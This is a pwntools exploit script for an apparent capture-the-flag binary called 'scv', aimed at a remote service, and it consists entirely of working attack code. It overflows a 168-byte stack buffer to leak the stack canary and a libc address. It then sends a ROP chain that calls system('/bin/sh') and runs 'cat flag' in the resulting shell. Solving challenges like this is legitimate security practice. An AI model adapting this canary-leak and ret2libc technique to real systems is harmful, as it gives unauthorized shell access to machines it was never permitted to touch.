#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('scv')

host = args.HOST or '10.67.0.1'
port = int(args.PORT or 31176)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

libc = None
def start(argv=[], *a, **kw):
    global libc

    '''Start the exploit against the target.'''
    if args.LOCAL:
        libc = ELF("/lib64/libc.so.6")
        return local(argv, *a, **kw)
    else:
        libc = ELF("scv_libc.so")
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x{exe.entry:x}
continue
'''.format(**locals())

# -- Exploit goes here --
# NX enabled
# Canary enabled
# Partial RELRO
context.terminal = ['gnome-terminal', '-e']
io = start()

prompt = '>>'
buff_size = 168

def recv_prompt():
    io.recvuntil(prompt)

def feed(msg):
    recv_prompt()
    io.sendline("1")
    recv_prompt()
    io.send(msg)

def review_food():
    recv_prompt()
    io.sendline("2")
    io.recvuntil("[*]PLEASE TREAT HIM WELL.....")
    io.recvline()
    io.recvline()

    return io.recvline()

def mine_minerals():
    recv_prompt()
    io.sendline("3")

def leak_stack_cookie():
    feed(cyclic(buff_size) + "X")
    line = review_food().strip()
    cookie = "\x00" + line[169:176]

    return u64(cookie)

def leak_libc():
    sz = buff_size + 16
    feed(cyclic(sz))
    line = review_food().strip()
    addr = line[sz:] + "\x00" * 2
    log.info(addr)

    return unpack(addr) - libc.symbols['__libc_start_main'] - 0xf0

cookie = leak_stack_cookie()
libc_addr = leak_libc()

log.info(hex(cookie))
log.info(hex(libc_addr))

libc.address = libc_addr
rop = ROP(libc)

rop.system(next(libc.search("/bin/sh\x00")))
log.info(rop.dump())

payload = cyclic(buff_size) + p64(cookie) + "junk" * 0x2 + rop.chain()
payload += "\x00" * (248 - len(payload))
log.info(payload)

feed(payload)
mine_minerals()
io.sendline("cat flag")
print (io.recv())
